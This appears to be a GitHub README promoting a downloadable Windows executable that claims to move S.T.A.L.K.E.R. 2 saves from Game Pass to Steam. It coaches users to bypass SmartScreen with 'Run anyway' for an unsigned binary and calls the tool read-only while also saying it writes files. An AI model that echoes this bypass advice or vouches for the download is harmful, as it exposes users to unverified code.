<p align="center">
  <img src="https://i.postimg.cc/ZKLsKQYt/banner.png" alt="STALKER 2 Game Pass to Steam Save Migrator — Convert PC Game Pass (WGS) Saves to Steam" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-GamePass%20%E2%86%94%20Steam-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-stalker2--wgs--migrator--26.11a-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# STALKER 2 Game Pass to Steam Save Migrator — Convert PC Game Pass (WGS) Saves to Steam

**Spent 40+ hours in the Zone on PC Game Pass and picked up S.T.A.L.K.E.R. 2: Heart of Chornobyl on Steam? Xbox App hides your .sav files inside hashed GSCGameWorld WGS containers. Extract and convert your saves to Steam cleanly.**

STALKER 2 Game Pass to Steam Save Migrator automates moving saves between Xbox App and Steam on Windows: **locating `%LOCALAPPDATA%\Packages\GSCGameWorld.S.T.A.L.K.E.R.2*\SystemAppData\wgs\`, decoding `container.index` to restore original `.sav` slot names, and copying them into `%LOCALAPPDATA%\Stalker2\Saved\SaveGames`**.

This project is aimed at **S.T.A.L.K.E.R. 2: Heart of Chornobyl on Windows 10/11 PC** for transferring manual, quick, and autosave `.sav` files between PC Game Pass and Steam.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| Steam S.T.A.L.K.E.R. 2 shows empty Load menu | PC Game Pass stores saves inside `GSCGameWorld.*\SystemAppData\wgs` | Decode `container.index` and extract `.sav` blobs to Steam `SaveGames` |
| Dozens of unnamed hex files inside `SystemAppData\wgs` | Each manual save, quicksave, and autosave is split across GUID folders | Reconstruct proper `.sav` filenames and timestamps automatically |
| Converted save missing from Steam Load screen | Steam Cloud or missing `Data` subfolder inside `Stalker2\Saved\SaveGames` | Place extracted `.sav` files into Steam's active `SaveGames\Data` folder |
| Accidentally overwriting newer progress | Mixing older Game Pass snapshots with active Steam saves | Create a dated backup of both folders before running migration |

## Download for Windows

[**Download Stalker2SaveMigrator.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/Stalker2SaveMigrator.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `Stalker2SaveMigrator.exe`? (Automatic checks in ~2 seconds)

- Finds `%LOCALAPPDATA%\Packages\GSCGameWorld.S.T.A.L.K.E.R.2*\SystemAppData\wgs` automatically.
- Parses `container.index` to identify manual saves, quicksaves, and autosaves with timestamps.
- Backs up existing Steam `Stalker2\Saved\SaveGames` before writing converted `.sav` files.
- Preserves your original Xbox Game Pass `wgs` containers untouched.

### Sample Diagnostic Output

```text
[Stalker2SaveMigrator] Scanning GSCGameWorld WGS & Steam SaveGames...
[OK]   Game Pass Package: C:\Users\Player\AppData\Local\Packages\GSCGameWorld.S.T.A.L.K.E.R.2_6911284
[OK]   WGS Containers   : 14 save slots decoded from container.index
[OK]   Backup Created   : Documents\Stalker2-SaveBackup\2026-11-20\
[OK]   Steam Target     : C:\Users\Player\AppData\Local\Stalker2\Saved\SaveGames\Data (14 .sav written)
```

The release ZIP is named `Stalker2SaveMigrator.zip`; the Windows executable inside is named `Stalker2SaveMigrator.exe`.

1. Close S.T.A.L.K.E.R. 2: Heart of Chornobyl before moving or checking files.
2. Click **Download Stalker2SaveMigrator.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `Stalker2SaveMigrator.exe`.
5. Review the reported locations and status checks before making any changes to your files.
6. Restart S.T.A.L.K.E.R. 2: Heart of Chornobyl and verify behavior after applying any recommended fixes.

**Requirements:** Windows 10 or 11 (64-bit) with PC Game Pass and/or Steam versions of S.T.A.L.K.E.R. 2 installed.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `Stalker2SaveMigrator.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project focuses on

### Heavy multi-slot save structure inside `GSCGameWorld` WGS

S.T.A.L.K.E.R. 2 creates separate container folders for every quicksave, autosave, and manual slot, making manual hex extraction tedious and error-prone.

### Steam `SaveGames\Data` subdirectory layout

Steam S.T.A.L.K.E.R. 2 expects `.sav` files inside `%LOCALAPPDATA%\Stalker2\Saved\SaveGames\Data\`.

### Steam Cloud overwriting local files on first boot

Running the Steam version once to initialize its cloud profile prevents Steam from wiping newly copied saves.

### Keeping Game Pass cloud progress intact

Reading `wgs` without modifying it guarantees you can still launch the Xbox App version anytime.

## Where S.T.A.L.K.E.R. 2: Heart of Chornobyl files normally belong

S.T.A.L.K.E.R. 2 stores Xbox Game Pass and Steam saves in two separate `%LOCALAPPDATA%` paths:

```text
%LOCALAPPDATA%\Packages\GSCGameWorld.S.T.A.L.K.E.R.2*\SystemAppData\wgs\
```

Inside that structure, key files and subdirectories typically look like this:

```text
Xbox Game Pass (Source):
%LOCALAPPDATA%\Packages\GSCGameWorld.S.T.A.L.K.E.R.2*\SystemAppData\wgs\<XUID>\
├── container.index
└── <ContainerGUID>\<HexBlob>

Steam Edition (Target):
%LOCALAPPDATA%\Stalker2\Saved\SaveGames\Data\
```

If you used gameplay mods on Game Pass, install the same compatible `.pak` mods in Steam's `~mods` folder before loading modded saves.

## A practical troubleshooting checklist

If your issue still persists, work through these checks in order:

1. **Close S.T.A.L.K.E.R. 2 on both Xbox App and Steam.** Wait for cloud synchronization to complete.
2. **Launch Steam S.T.A.L.K.E.R. 2 once to the main menu, then exit.** Creates `%LOCALAPPDATA%\Stalker2\Saved\SaveGames\Data`.
3. **Back up both `wgs` and Steam `Stalker2\Saved` folders.** Save dated copies in Documents.
4. **Run the WGS-to-Steam save extraction.** Verify all manual and autosave `.sav` files appear in `SaveGames\Data`.
5. **Launch Steam S.T.A.L.K.E.R. 2, load your save, and make a fresh manual save.** Syncs your Zone progress to Steam Cloud.

### Before moving any files

Never delete or rename files inside `SystemAppData\wgs\`; work strictly with extracted `.sav` copies.

## What an effective diagnostic report should tell you

A clear migration report lists **detected `GSCGameWorld` package path, decoded `.sav` slot count, backup path, and target Steam `SaveGames\Data` status**.

## FAQ

**Can I transfer my S.T.A.L.K.E.R. 2 save from Xbox Game Pass PC to Steam?**

Yes—extracting the `.sav` payloads from `SystemAppData\wgs` into `%LOCALAPPDATA%\Stalker2\Saved\SaveGames\Data` works seamlessly.

**Why are there so many folders inside `wgs`?**

Each manual save, quicksave, and autosave in S.T.A.L.K.E.R. 2 is stored as its own container entry inside `container.index`.

**Does this delete my Xbox Game Pass save?**

No. Your original `wgs` folder is read-only and remains untouched.

## Useful reading

- [S.T.A.L.K.E.R. 2: Heart of Chornobyl on Steam](https://store.steampowered.com/app/1643320/STALKER_2_Heart_of_Chornobyl/)
- [Official S.T.A.L.K.E.R. 2 Website](https://www.stalker2.com/)

## More Windows Game Diagnostic Tools

- [Stalker2-ShaderCacheGuard](../Stalker2-ShaderCacheGuard) — S.T.A.L.K.E.R. 2 UE5 shader compilation & `C:` space check
- [Fable2026-GamePassSaveBridge](../Fable2026-GamePassSaveBridge) — Fable (2026) Game Pass ↔ Steam save converter
- [GearsEDay-WGSSaveConverter](../GearsEDay-WGSSaveConverter) — Gears of War: E-Day Game Pass ↔ Steam save converter
- [Palworld-GamePassSteamBridge](../Palworld-GamePassSteamBridge) — Palworld Xbox Game Pass ↔ Steam `Level.sav` converter

*Independent community project. Not affiliated with GSC Game World, Microsoft, Valve, or Steam.*
 
 
